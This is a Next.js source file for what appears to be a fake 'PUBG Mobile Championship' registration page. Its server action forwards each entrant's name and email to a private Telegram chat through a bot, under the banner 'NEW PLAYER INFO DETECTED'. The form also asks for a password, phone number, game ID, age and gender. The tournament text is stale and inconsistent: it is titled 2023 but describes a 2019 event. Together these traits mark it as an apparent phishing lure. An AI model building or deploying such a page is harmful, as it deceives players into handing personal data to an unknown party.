import { Telegraf } from "telegraf";

export default async function Home() {
  const handleFormSubmit = async (formdata: FormData) => {
    "use server";
    let bot = new Telegraf(process.env.TELEGRAM_TOKEN!);
    await bot.telegram.sendMessage(
      process.env.TELEGRAM_CHATID!,
      `
      \n🤖 NEW PLAYER INFO DETECTED 🤖\n

      PLAYER NAME  :- ${formdata.get("fm-name-1")}\n
      PLAYER EMAIL :- ${formdata.get("fm-email")}\n

      \n 👌🏻👌🏻👌🏻👌🏻👌🏻👌🏻👌🏻👌🏻👌🏻👌🏻👌🏻👌🏻👌🏻👌🏻\n


      `
    );
    console.log("FORM DATA IS ", formdata);
  };
  return (
    <>
      <nav id="mainNav">
        <div className="nav-content">
          <ul>
            <li>
              <a href="#secAbout" className="smooth_scroll">
                About
              </a>
            </li>
            <li>
              <a href="#secSchedule" className="smooth_scroll">
                Schedule
              </a>
            </li>
            <li>
              <a href="#secVenue" className="smooth_scroll">
                Venue
              </a>
            </li>
            <li>
              <a href="#secPrize" className="smooth_scroll">
                Prize
              </a>
            </li>
            <li>
              <a href="#secRegister" className="smooth_scroll">
                Register
              </a>
            </li>
            <li>
              <a
                href="https://www.pubgmobile.com/en-US/"
                style={{ color: "#ffc613" }}
                target="_blank"
              >
                Download
              </a>
            </li>
          </ul>
        </div>
      </nav>
      <section id="secHero">
        <div className="hero-content">
          <h1>PUBG Mobile Championship 2023</h1>
          <a href="#secRegister">
            <button className="but-register">Register</button>
          </a>
        </div>
      </section>

      <section id="secAnnounce">
        <div className="announce-content">
          <div className="announce-head">Announcement</div>
          <p className="announce-text">Tournament date released!</p>
        </div>
      </section>
      <section id="secAbout" className="sec-container-light">
        <div className="sec-content">
          <h2>About</h2>
          <img id="imgAbout" src="/images/pubg_car.png" alt="PUBG Car" />

          <p>
            PUBG MOBILE CHAMPIONSHIP 2019 is a PUBG MOBILE tournament
            exclusively for college students featuring a total prize pool of
            over 50 Lakh INR. Teams will qualify based on the match results.
            Play to win and play for fun! A competition of both skills and
            popularity! Compete over four consecutive weekends to become the
            official streamer for the region! Winning players from all regions
            will come together to compete for the role of official streamer! It
            is the biggest e-sports event in India and will bring in the biggest
            sponsors a gaming event has ever seen. So what are you waiting for?
            It s a solo tournament, just go and register!
          </p>
        </div>
      </section>
      <section id="secSchedule" className="sec-container-dark">
        <div className="sec-content">
          <h2>Schedule</h2>
          <p>
            PUBG MOBILE CHAMPIONSHIP will span from 12th Feb, 2019 to 3rd April,
            2019. See you on the BATTLEGROUND!
          </p>
          <div className="tab-container">
            <table className="tab-schedule">
              <tbody>
                <tr>
                  <th>Activity</th>
                  <th>Start</th>
                  <th>End</th>
                </tr>
                <tr>
                  <td>Registraion</td>
                  <td>12th Feb</td>
                  <td>28th Feb</td>
                </tr>
                <tr>
                  <td>Check-In</td>
                  <td>2nd Mar</td>
                  <td>3rd Mar</td>
                </tr>
                <tr>
                  <td>Online Qualifiers</td>
                  <td>4th Mar</td>
                  <td>15th Mar</td>
                </tr>
                <tr>
                  <td>Grand Finals</td>
                  <td>1st Apr</td>
                  <td>3rd Apr</td>
                </tr>
              </tbody>
            </table>
          </div>
        </div>
      </section>

      <section id="secVenue" className="sec-container-light">
        <div className="sec-content">
          <h2>Venue</h2>
          <p>The GRAND FINALS will be held at</p>
          <div id="venueName">Dbuu University, Dehradun</div>
        </div>
      </section>

      <section id="secPrize" className="sec-container-dark">
        <div className="sec-content">
          <h2>Prize Pool</h2>
          <p>
            PUBG MOBILE CHAMPIONSHIP 2019 is featuring a prize pool of over 50
            Lakh INR.
          </p>
          <img
            style={{ width: "100%", marginTop: 20 }}
            src="/images/prize-pool.png"
            alt="Prize Pool"
          />
        </div>
      </section>

      <section id="secRegister" className="sec-container-light">
        <div className="sec-content">
          <h2>Register</h2>
          <p id="secRegisterPara">
            Fill out the following details to enter the tournament:
          </p>
          <form
            id="formRegister"
            name="formRegister"
            className="form-content"
            action={handleFormSubmit}
          >
            <div className="form-row">
              <div className="form-group">
                <label>Name</label>
                <input
                  type="text"
                  id="fm-name-1"
                  name="fm-name-1"
                  pattern="[a-zA-Z\s]+"
                  required={true}
                />
              </div>
            </div>
            <div className="form-row">
              <div className="form-group">
                <label>Your Email</label>
                <input
                  type="email"
                  id="fm-email"
                  name="fm-email"
                  pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,4}$"
                  required={true}
                />
              </div>
              <div className="form-group" style={{ position: "relative" }}>
                <label>New Password</label>
                <input
                  type="password"
                  id="fm-password"
                  name="fm-password"
                  pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*[0-9])(?=.*[\W]).{8,}$"
                  required={true}
                />
                <div className="fm-password-tooltip">
                  <p
                    id="fm-password-tooltip-lowercase"
                    className="fm-password-invalid"
                  >
                    A lowercase letter
                  </p>
                  <p
                    id="fm-password-tooltip-uppercase"
                    className="fm-password-invalid"
                  >
                    A uppercase letter
                  </p>
                  <p
                    id="fm-password-tooltip-number"
                    className="fm-password-invalid"
                  >
                    A number
                  </p>
                  <p
                    id="fm-password-tooltip-symbol"
                    className="fm-password-invalid"
                  >
                    A symbol
                  </p>
                  <p
                    id="fm-password-tooltip-length"
                    className="fm-password-invalid"
                  >
                    Minimum 8 characters
                  </p>
                </div>
              </div>
            </div>
            <div className="form-row">
              <div className="form-group">
                <label>Mobile Number</label>
                <input
                  type="tel"
                  id="fm-phone"
                  name="fm-phone"
                  pattern="[0-9]{10}"
                  required={true}
                />
              </div>
              <div className="form-group">
                <label>PUBG ID</label>
                <input
                  type="text"
                  id="fm-pubg-id"
                  name="fm-pubg-id"
                  pattern="[0-9]{9}"
                  required={true}
                />
              </div>
            </div>
            <div className="form-row">
              <div className="form-group">
                <label>Age</label>
                <input
                  type="number"
                  id="fm-age"
                  name="fm-age"
                  min={16}
                  max={80}
                  pattern="[0-9]{1}[0-9]{0,1}"
                  required={true}
                />
              </div>
              <div className="form-group" style={{ display: "block" }}>
                <label>Gender</label>
                <div>
                  <label className="form-radio">
                    Male
                    <input
                      style={{ display: "inline" }}
                      type="radio"
                      name="fm-gender"
                      defaultValue="male"
                      required={true}
                    />
                    <span className="checkmark" />
                  </label>
                  &nbsp;
                  <label className="form-radio">
                    Female
                    <input
                      style={{ display: "inline" }}
                      type="radio"
                      name="fm-gender"
                      defaultValue="female"
                      required={true}
                    />
                    <span className="checkmark" />
                  </label>
                </div>
              </div>
            </div>
            <div className="form-row">
              <div className="form-group">
                <p id="validationInfo" />
              </div>
            </div>

            <button id="fm-submit" type="submit">
              Submit
            </button>
          </form>
        </div>
      </section>

      <section id="secPattern">
        <div className="pattern-content">&nbsp;</div>
      </section>

      <footer>
        <div className="sec-content">
          <div className="footer-social">
            <a href="#" target="_blank">
              <img src="/images/social/twitter.png" alt="Twitter" />
            </a>
            <a href="#" target="_blank">
              <img src="/images/social/facebook.png" alt="Facebook" />
            </a>
            <a href="#" target="_blank">
              <img src="/images/social/instagram.png" alt="Instagram" />
            </a>
            <a href="#" target="_blank">
              <img src="/images/social/youtube.png" alt="Youtube" />
            </a>
          </div>
          <div className="footer-copyright">
            <p>© Xteam</p>
          </div>
        </div>
      </footer>
    </>
  );
}
